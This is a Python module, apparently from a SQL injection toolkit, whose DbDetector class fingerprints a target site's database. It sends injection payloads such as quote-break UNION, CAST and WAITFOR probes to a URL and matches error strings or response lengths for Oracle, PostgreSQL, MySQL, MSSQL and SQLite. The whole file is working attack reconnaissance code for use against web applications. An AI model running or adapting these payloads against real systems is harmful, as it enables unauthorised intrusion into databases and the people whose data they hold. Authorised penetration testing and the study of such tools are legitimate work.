from .main import BaseSQLi
from .dbConfig import DB_CONFIG


FINGERPRINTS = [
    {
        "db": "oracle",
        "payloads": [
            "' UNION SELECT NULL FROM dual--",
            "' AND BANNER IS NOT NULL--",
        ],
        "error_strings": ["ORA-", "oracle"],
        "version_func": "SELECT banner FROM v$version WHERE ROWNUM=1",
    },
    {
        "db": "postgresql",
        "payloads": [
            "' AND version()::int=1--",
            "' AND 1=CAST(version() AS int)--",
        ],
        "error_strings": ["PostgreSQL", "pg_", "ERROR:"],
        "version_func": "SELECT version()",
    },
    {
        "db": "mysql",
        "payloads": [
            "' AND @@version#",
            "' AND SLEEP(0)#",
        ],
        "error_strings": ["MySQL", "MariaDB", "mysql"],
        "version_func": "SELECT @@version",
    },
    {
        "db": "mssql",
        "payloads": [
            "' AND @@version=1--",
            "' WAITFOR DELAY '0:0:0'--",
        ],
        "error_strings": ["Microsoft", "SQL Server", "mssql", "ODBC"],
        "version_func": "SELECT @@version",
    },
    {
        "db": "sqlite",
        "payloads": [
            "' AND sqlite_version() IS NOT NULL--",
        ],
        "error_strings": ["SQLite", "sqlite3"],
        "version_func": "SELECT sqlite_version()",
    },
]


class DbDetector(BaseSQLi):
    def __init__(self, url, inject_point=None, extra_cookies=None, proxy=None, verify=True, timeout=10):
        super().__init__(url, "unknown", "oracle", inject_point, extra_cookies, proxy, verify, timeout)

    def detect(self):
        print("[*] Auto-detecting database type...")

        result = self._detect_by_error()
        if result:
            return result

        result = self._detect_by_behavior()
        if result:
            return result

        print("[-] Could not auto-detect database type.")
        return None

    def _detect_by_error(self):
        print("[*] Phase 1: Error-based fingerprinting...")
        probe = "' AND 1=CAST(1 AS int)--"
        try:
            response = self.send(probe)
            text = response.text.lower()
            for fp in FINGERPRINTS:
                for err in fp["error_strings"]:
                    if err.lower() in text:
                        db = fp["db"]
                        print(f"[+] Error fingerprint match: {db} (found '{err}')")
                        return db
        except Exception:
            pass

        for fp in FINGERPRINTS:
            for payload in fp["payloads"]:
                try:
                    response = self.send(payload)
                    text = response.text.lower()
                    for err in fp["error_strings"]:
                        if err.lower() in text:
                            db = fp["db"]
                            print(f"[+] Error fingerprint match: {db} (found '{err}')")
                            return db
                except Exception:
                    continue

        print("[-] No error fingerprints found.")
        return None

    def _detect_by_behavior(self):
        print("[*] Phase 2: Behavior-based fingerprinting...")

        baseline = self.send("' AND '1'='1")
        baseline_len = len(baseline.text)

        tests = [
            ("oracle", "' AND (SELECT 1 FROM dual)=1--"),
            ("mysql", "' AND SLEEP(0)=0#"),
            ("postgresql", "' AND 1=1::int--"),
            ("mssql", "' AND 1=1--"),
            ("sqlite", "' AND typeof(1)='integer'--"),
        ]

        for db, payload in tests:
            try:
                response = self.send(payload)
                if response.status_code == 200 and abs(len(response.text) - baseline_len) < 100:
                    print(f"[+] Behavior match: {db}")
                    return db
            except Exception:
                continue

        return None
